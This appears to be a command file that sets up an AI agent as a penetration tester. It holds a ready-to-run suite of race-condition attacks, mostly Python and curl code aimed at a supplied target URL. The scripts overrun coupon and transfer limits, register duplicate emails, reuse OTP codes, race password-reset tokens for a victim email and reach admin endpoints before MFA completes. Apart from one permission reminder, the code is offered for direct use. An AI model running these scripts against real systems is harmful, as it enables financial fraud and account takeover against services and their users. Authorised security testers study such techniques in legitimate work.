---
description: Race condition attacks — single-packet technique, limit overrun, 2FA OTP race, email uniqueness race, coupon stacking, TOCTOU exploitation
argument-hint: <target-base-url> [auth-token]
allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-pentest__execute_parallel]
---

# pt-race — Race Condition Attack Suite

You are a senior penetration tester applying the 2023 state-of-the-art single-packet attack technique. Traditional race condition testing (send N concurrent requests) fails due to network jitter. The single-packet attack eliminates jitter by bundling all requests into a single TCP packet (HTTP/2) or using TCP_NODELAY with last-byte synchronization.

**Core principle**: Server processes all requests "simultaneously" because they arrive in the same network packet. Race window collapses from ~10ms to ~1ms — making many more race conditions exploitable.

**When to use**: When you see: coupon/discount redemption, gift card redemption, loyalty point spend, withdrawal/transfer limits, email uniqueness enforcement, OTP/2FA verification, rate-limited endpoints, or any action that checks a condition THEN modifies state.

```bash
BASE_URL="$ARGUMENTS"
BASE_URL="${BASE_URL%% *}"
TOKEN="${ARGUMENTS#* }"
[ "$TOKEN" = "$BASE_URL" ] && TOKEN=""
ENG=/home/kali/current

echo "=== pt-race: Race Condition Attack Suite ==="
echo "Target: $BASE_URL"
echo ""
echo "Phases:"
echo "  1 — Endpoint discovery (race-prone endpoints)"
echo "  2 — Single-packet limit overrun (coupon/balance/points)"
echo "  3 — Email uniqueness race"
echo "  4 — 2FA OTP race"
echo "  5 — Password reset token race"
echo "  6 — Session upgrade race"

# Check HTTP/2 support (required for single-packet attack)
echo ""
echo "=== HTTP/2 Support Check ==="
curl -sk --http2 "$BASE_URL" -o /dev/null -w "HTTP version: %{http_version}\n" 2>/dev/null
curl -sk --http2-prior-knowledge "$BASE_URL" -o /dev/null -w "h2 prior knowledge: %{http_version}\n" 2>/dev/null
```

---

## Phase 1 — Race-Prone Endpoint Discovery

```bash
BASE_URL=<base_url>
TOKEN=<auth_token>

echo "=== Phase 1: Race-Prone Endpoint Discovery ==="

# Identify endpoints that check-then-modify state
echo "--- Scanning for race-prone endpoints ---"
for path in \
    /api/redeem /api/coupon /api/voucher /api/gift-card \
    /api/transfer /api/withdraw /api/payment \
    /api/vote /api/like /api/upvote /api/flag \
    /api/register /api/signup /api/create-account \
    /api/verify-otp /api/verify-2fa /api/verify-email \
    /api/apply-discount /api/apply-promo /api/apply-code \
    /api/referral /api/invite /api/bonus \
    /api/checkout /api/order /api/purchase \
    /api/reset-password /api/forgot-password; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $TOKEN" \
        "$BASE_URL$path" --max-time 3 2>/dev/null)
    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [$CODE] $path — RACE CANDIDATE"
done

echo ""
echo "Race candidates identified above. Test each with Phase 2 (single-packet attack)."
```

---

## Phase 2 — Single-Packet Limit Overrun

**The single-packet technique**: Use `--http2` with curl's parallel feature, or Python's httpx library. All requests arrive in same TCP segment → server dequeues and processes them before any "used" flag is set.

```bash
BASE_URL=<base_url>
TOKEN=<auth_token>
COUPON_CODE="SAVE20"   # or whatever code you found
ENDPOINT="/api/apply-coupon"  # race target endpoint

echo "=== Phase 2: Single-Packet Limit Overrun ==="

# Method 1: Python httpx with HTTP/2 (best — true single-packet)
pip3 install httpx 2>/dev/null | tail -1

python3 - << 'PYEOF'
import httpx, asyncio, json

BASE_URL = "<base_url>"
TOKEN = "<auth_token>"
ENDPOINT = "/api/apply-coupon"
COUPON = "SAVE20"
N = 30  # number of simultaneous requests

async def send_race(client, idx):
    try:
        r = await client.post(
            f"{BASE_URL}{ENDPOINT}",
            json={"code": COUPON, "request_id": idx},
            headers={"Authorization": f"Bearer {TOKEN}"}
        )
        return {"idx": idx, "status": r.status_code, "body": r.text[:100]}
    except Exception as e:
        return {"idx": idx, "error": str(e)}

async def main():
    # HTTP/2 with connection warmup (single-packet attack)
    limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
    async with httpx.AsyncClient(http2=True, limits=limits, verify=False) as client:
        # Warm the connection (don't count this)
        await client.get(f"{BASE_URL}/", headers={"Authorization": f"Bearer {TOKEN}"})
        print(f"[*] Connection warmed. Sending {N} race requests simultaneously...")
        # Now fire all at once
        tasks = [send_race(client, i) for i in range(N)]
        results = await asyncio.gather(*tasks)

    # Analyze results
    success = [r for r in results if r.get("status") in [200, 201]]
    print(f"\n[*] Results: {len(success)}/{N} succeeded")
    for r in results[:10]:
        print(f"  [{r.get('idx')}] HTTP {r.get('status')} | {r.get('body','')[:80]}")

    if len(success) > 1:
        print(f"\n[!] RACE CONDITION CONFIRMED — {len(success)} requests succeeded (should be max 1)")

asyncio.run(main())
PYEOF
```

```bash
BASE_URL=<base_url>
TOKEN=<auth_token>
ENDPOINT="<race_target_endpoint>"
PAYLOAD='{"amount":100,"to_user":"victim_user_id"}'  # adjust for target

echo "=== Phase 2b: Parallel curl (fallback if httpx unavailable) ==="
echo "Note: this has more jitter than httpx HTTP/2 approach"
echo ""

# Method 2: parallel curl (HTTP/1.1 — less precise but works)
RESULTS_DIR=$(mktemp -d)
for i in $(seq 1 20); do
    curl -sk -X POST "$BASE_URL$ENDPOINT" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD" \
        -o "$RESULTS_DIR/result_$i.txt" \
        -w "$i: HTTP %{http_code}\n" 2>/dev/null &
done
wait

echo "Results:"
for f in "$RESULTS_DIR"/result_*.txt; do
    idx=$(basename $f .txt | cut -d_ -f2)
    echo "  Request $idx: $(head -c 100 $f)"
done

# Count successes
SUCCESS=$(grep -l "success\|true\|201\|discount" "$RESULTS_DIR"/*.txt 2>/dev/null | wc -l)
echo ""
echo "Successes (contains 'success/true/201/discount'): $SUCCESS"
[ "$SUCCESS" -gt 1 ] && echo "  [!] RACE CONDITION — $SUCCESS parallel requests succeeded"
rm -rf "$RESULTS_DIR"
```

---

## Phase 3 — Email Uniqueness Race

**Why**: Registration endpoint checks `SELECT COUNT(*) FROM users WHERE email=?` then `INSERT`. Between check and insert, send 5 simultaneous requests with same email → multiple accounts created for same email address → two different accounts, one email, security implications.

```bash
BASE_URL=<base_url>
RACE_EMAIL="race-$(date +%s)@evil.com"

echo "=== Phase 3: Email Uniqueness Race ==="
echo "Target email: $RACE_EMAIL"
echo ""

pip3 install httpx 2>/dev/null | tail -1

python3 - << 'PYEOF'
import httpx, asyncio

BASE_URL = "<base_url>"
RACE_EMAIL = "race-test-unique@evil.com"  # use same email for all
N = 10

async def register(client, idx):
    try:
        r = await client.post(
            f"{BASE_URL}/api/register",
            json={
                "email": RACE_EMAIL,
                "username": f"raceuser{idx}",
                "password": "RaceTest123!",
                "request_idx": idx
            }
        )
        return {"idx": idx, "status": r.status_code, "body": r.text[:150]}
    except Exception as e:
        return {"idx": idx, "error": str(e)}

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        # Warm connection
        try: await client.get(f"{BASE_URL}/")
        except: pass
        print(f"[*] Sending {N} simultaneous registrations with same email...")
        results = await asyncio.gather(*[register(client, i) for i in range(N)])

    success = [r for r in results if r.get("status") in [200, 201]]
    print(f"[*] {len(success)}/{N} registrations succeeded")
    for r in results:
        print(f"  [{r['idx']}] HTTP {r.get('status')} | {r.get('body','')[:100]}")

    if len(success) > 1:
        print(f"\n[!] EMAIL UNIQUENESS RACE — {len(success)} accounts created for same email!")
        print("    Impact: two separate accounts, one email, email verification bypass, privilege confusion")

asyncio.run(main())
PYEOF
```

---

## Phase 4 — 2FA / OTP Race Condition

**Why**: Server receives POST /verify-otp → checks if OTP matches AND hasn't been used → marks as used. Two simultaneous requests arrive before the "mark as used" step completes → both succeed.

```bash
BASE_URL=<base_url>
SESSION="<session_cookie_or_token>"
OTP_CODE="<valid_6_digit_otp>"

echo "=== Phase 4: 2FA OTP Race ==="

pip3 install httpx 2>/dev/null | tail -1

python3 - << 'PYEOF'
import httpx, asyncio

BASE_URL = "<base_url>"
SESSION = "<session_token>"
OTP_CODE = "<valid_otp>"
N = 15  # must be fast — OTP valid window is short

async def verify_otp(client, idx):
    try:
        r = await client.post(
            f"{BASE_URL}/api/verify-otp",
            json={"otp": OTP_CODE, "code": OTP_CODE, "token": OTP_CODE},
            headers={"Authorization": f"Bearer {SESSION}", "Cookie": f"session={SESSION}"}
        )
        return {"idx": idx, "status": r.status_code, "body": r.text[:100]}
    except Exception as e:
        return {"idx": idx, "error": str(e)}

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        try: await client.get(f"{BASE_URL}/")
        except: pass
        print(f"[*] Firing {N} OTP verify requests simultaneously...")
        results = await asyncio.gather(*[verify_otp(client, i) for i in range(N)])

    success = [r for r in results if r.get("status") in [200, 201]]
    errors = [r for r in results if r.get("status") in [400, 401, 403, 429]]
    print(f"[*] Success: {len(success)} | Failed: {len(errors)} | Total: {len(results)}")
    for r in results[:10]:
        print(f"  [{r['idx']}] HTTP {r.get('status')} | {r.get('body','')[:80]}")

    if len(success) > 1:
        print("\n[!] OTP RACE — OTP accepted multiple times before marked used!")

asyncio.run(main())
PYEOF
```

---

## Phase 5 — Password Reset Token Race

**Why**: Request two password reset emails simultaneously → server should issue one token and invalidate the other. If not atomic: two valid tokens exist for same account. Attacker requests a reset, victim also requests a reset, both tokens work.

```bash
BASE_URL=<base_url>

echo "=== Phase 5: Password Reset Token Race ==="

python3 - << 'PYEOF'
import httpx, asyncio

BASE_URL = "<base_url>"
VICTIM_EMAIL = "<target_email>"
N = 5  # request N reset tokens simultaneously

async def request_reset(client, idx):
    try:
        r = await client.post(
            f"{BASE_URL}/api/password-reset",
            json={"email": VICTIM_EMAIL}
        )
        return {"idx": idx, "status": r.status_code, "body": r.text[:100]}
    except Exception as e:
        return {"idx": idx, "error": str(e)}

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        try: await client.get(f"{BASE_URL}/")
        except: pass
        print(f"[*] Requesting {N} simultaneous password resets for {VICTIM_EMAIL}...")
        results = await asyncio.gather(*[request_reset(client, i) for i in range(N)])

    for r in results:
        print(f"  [{r['idx']}] HTTP {r.get('status')} | {r.get('body','')[:80]}")

    print("\n[*] Check email for multiple reset links — if > 1 valid link = race condition")
    print("    Also: does requesting a new token invalidate the previous one?")

asyncio.run(main())
PYEOF
```

---

## Phase 6 — Session Upgrade Race (Pre-MFA Token)

**Why**: App issues session after password check (step 1 of 2FA). Before MFA is complete, that session may already have partial permissions. Race: submit MFA + access privileged resource simultaneously.

```bash
BASE_URL=<base_url>
PRE_MFA_SESSION="<session_after_password_before_mfa>"
VALID_OTP="<valid_otp>"

echo "=== Phase 6: Session Upgrade Race ==="

python3 - << 'PYEOF'
import httpx, asyncio

BASE_URL = "<base_url>"
PRE_MFA_SESSION = "<session_before_mfa_complete>"
VALID_OTP = "<otp>"

async def verify_mfa(client):
    return await client.post(
        f"{BASE_URL}/api/verify-otp",
        json={"otp": VALID_OTP},
        headers={"Cookie": f"session={PRE_MFA_SESSION}"}
    )

async def access_protected(client):
    return await client.get(
        f"{BASE_URL}/api/admin",
        headers={"Cookie": f"session={PRE_MFA_SESSION}"}
    )

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        await client.get(f"{BASE_URL}/")

        print("[*] Sending MFA verify + privileged access in same packet...")
        mfa_result, access_result = await asyncio.gather(
            verify_mfa(client),
            access_protected(client)
        )

        print(f"MFA verify: HTTP {mfa_result.status_code}")
        print(f"Protected access: HTTP {access_result.status_code}")
        print(f"Protected response: {access_result.text[:200]}")

        if access_result.status_code == 200 and "admin" in access_result.text.lower():
            print("\n[!] SESSION UPGRADE RACE — accessed protected resource before MFA completed!")

asyncio.run(main())
PYEOF
```

---

## Phase 7 — Withdrawal / Transfer Limit Overrun

```bash
BASE_URL=<base_url>
TOKEN=<auth_token>

echo "=== Phase 7: Withdrawal / Balance Race ==="
echo "(Test only on accounts you own / have permission to test)"

python3 - << 'PYEOF'
import httpx, asyncio

BASE_URL = "<base_url>"
TOKEN = "<auth_token>"
N = 25  # concurrent transfers
AMOUNT = 100  # amount per request (your balance might only cover 1)
RECIPIENT = "<other_test_account_id>"

async def transfer(client, idx):
    try:
        r = await client.post(
            f"{BASE_URL}/api/transfer",
            json={"amount": AMOUNT, "to": RECIPIENT, "currency": "USD"},
            headers={"Authorization": f"Bearer {TOKEN}"}
        )
        return {"idx": idx, "status": r.status_code, "body": r.text[:100]}
    except Exception as e:
        return {"idx": idx, "error": str(e)}

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        await client.get(f"{BASE_URL}/", headers={"Authorization": f"Bearer {TOKEN}"})
        print(f"[*] Firing {N} simultaneous transfer requests (${AMOUNT} each)...")
        results = await asyncio.gather(*[transfer(client, i) for i in range(N)])

    success = [r for r in results if r.get("status") in [200, 201]]
    print(f"\n[*] {len(success)}/{N} transfers succeeded")
    for r in results[:15]:
        print(f"  [{r['idx']}] HTTP {r.get('status')} | {r.get('body','')[:80]}")

    if len(success) > 1:
        total = len(success) * AMOUNT
        print(f"\n[!] LIMIT OVERRUN — {len(success)} transfers (${total} total) succeeded despite limit!")

asyncio.run(main())
PYEOF
```

---

## Phase 8 — Coupon / Discount Stack Race

```bash
echo "=== Phase 8: Coupon Stack Race ==="

python3 - << 'PYEOF'
import httpx, asyncio

BASE_URL = "<base_url>"
TOKEN = "<auth_token>"
ORDER_ID = "<order_or_cart_id>"
COUPON = "<valid_coupon_code>"
N = 20

async def apply_coupon(client, idx):
    try:
        r = await client.post(
            f"{BASE_URL}/api/apply-coupon",
            json={"coupon": COUPON, "order_id": ORDER_ID},
            headers={"Authorization": f"Bearer {TOKEN}"}
        )
        return {"idx": idx, "status": r.status_code, "body": r.text[:120]}
    except Exception as e:
        return {"idx": idx, "error": str(e)}

async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        await client.get(f"{BASE_URL}/", headers={"Authorization": f"Bearer {TOKEN}"})
        print(f"[*] Applying coupon {COUPON} {N} times simultaneously to order {ORDER_ID}...")
        results = await asyncio.gather(*[apply_coupon(client, i) for i in range(N)])

    success = [r for r in results if r.get("status") in [200, 201]]
    print(f"\n[*] {len(success)}/{N} coupon applications succeeded")
    for r in results:
        print(f"  [{r['idx']}] HTTP {r.get('status')} | {r.get('body','')[:80]}")

    print("\n[*] Now check order total — has discount been applied multiple times?")
    r = await client.get(f"{BASE_URL}/api/orders/{ORDER_ID}",
                          headers={"Authorization": f"Bearer {TOKEN}"})
    print(f"Order state: {r.text[:200]}")

asyncio.run(main())
PYEOF
```

---

## CVSS Reference

| Finding | CVSS | Impact |
|---------|------|--------|
| Limit overrun (balance/withdrawal) | 8.1 | AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N | Financial loss |
| OTP race → auth bypass | 8.1 | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N | Account takeover |
| Email uniqueness race | 5.3 | AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N | Auth confusion |
| Coupon stacking | 6.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N | Financial loss |
| Reset token race | 6.8 | AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N | Account takeover |

---

## Expert Notes

**The single-packet attack matters**: Traditional race testing with `&` in bash has 50–100ms jitter. The single-packet attack (HTTP/2 frame bundling) collapses this to <1ms. Many endpoints that appear "safe" to traditional testing are vulnerable to the single-packet approach. Always use the httpx Python script, not parallel curl.

**Connection warming is mandatory**: The first request to a server incurs TLS handshake + TCP setup (~100ms). If you include this in the race, requests won't be simultaneous. Always send one warmup request first, then fire the race.

**Look for the check-then-act pattern**: Find any endpoint that: (1) reads a value from DB, (2) makes a decision based on it, (3) writes a different value. That gap is the race window. Examples: `balance >= amount → deduct balance`, `coupon.used == false → mark used`, `email not exists → insert user`.

**HTTP/1.1 last-byte sync alternative**: If HTTP/2 not supported, you can achieve similar results by sending all requests with `Content-Length` set but holding back the last byte. Once all connections are established, send the last byte of all requests simultaneously via a custom script. This is Burp Turbo Intruder's technique.
